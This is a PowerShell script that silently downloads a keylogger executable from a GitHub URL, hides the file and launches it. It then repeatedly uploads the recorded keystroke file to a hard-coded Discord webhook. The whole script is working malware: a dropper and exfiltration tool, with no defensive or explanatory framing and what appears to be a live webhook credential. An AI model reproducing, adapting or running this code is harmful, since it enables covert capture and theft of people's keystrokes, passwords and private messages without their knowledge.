# Suppress errors and debug lines
$ErrorActionPreference = "SilentlyContinue"

# Download the executable from the GitHub URL
$downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
$textFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\recorded_sequence.txt')

Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $downloadPath

# Check if the download was successful
if (Test-Path $downloadPath) {
    # Set the "Hidden" attribute to "True" to hide the file
    Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    # Execute the downloaded executable
    Start-Process -FilePath $downloadPath -NoNewWindow

    # Define the Discord webhook URL
    $webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"

    # Function to send a file to Discord using a webhook and log the response
    function Send-FileToDiscord {
        param (
            [string]$WebhookUrl,
            [string]$FilePath
        )

        # Define the boundary for multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()

        # Build the multipart/form-data body
        $body = [System.Text.StringBuilder]@{}
        $body.AppendLine("--$boundary")
        $body.AppendLine('Content-Disposition: form-data; name="file"; filename="' + (Get-Item $FilePath).Name + '"')
        $body.AppendLine('Content-Type: application/octet-stream')
        $body.AppendLine()
        $body.AppendLine([System.IO.File]::ReadAllText($FilePath))
        $body.AppendLine("--$boundary--")

        # Convert the body to bytes
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body.ToString())

        # Create a web request
        $request = [System.Net.WebRequest]::Create($WebhookUrl)
        $request.Method = "POST"
        $request.ContentType = "multipart/form-data; boundary=$boundary"
        $request.ContentLength = $bodyBytes.Length

        # Get the request stream and write the body
        $requestStream = $request.GetRequestStream()
        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestStream.Close()

        # Get the response
        $response = $request.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseStream)
        $responseText = $reader.ReadToEnd()
        $reader.Close()
        $responseStream.Close()
        $response.Close()

        # Log the response from Discord
        Write-Host "Discord Webhook Response: $responseText"
    }

    # Sleep for a few seconds to allow time for the executable to create the text file
    Start-Sleep -Seconds 10  # Adjust the delay time as needed

    # Send the file to Discord every 30 seconds for 5 minutes (10 times)
    $durationInSeconds = 300  # 5 minutes
    $intervalInSeconds = 30  # 30 seconds
    $startTime = Get-Date

    while ((Get-Date) -lt ($startTime.AddSeconds($durationInSeconds))) {
        # Upload the text file to Discord
        Send-FileToDiscord -WebhookUrl $webhookUrl -FilePath $textFilePath

        # Sleep for 30 seconds
        Start-Sleep -Seconds $intervalInSeconds
    }
} else {
    Write-Host 'Download failed. Please check the GitHub URL and try again.'
}
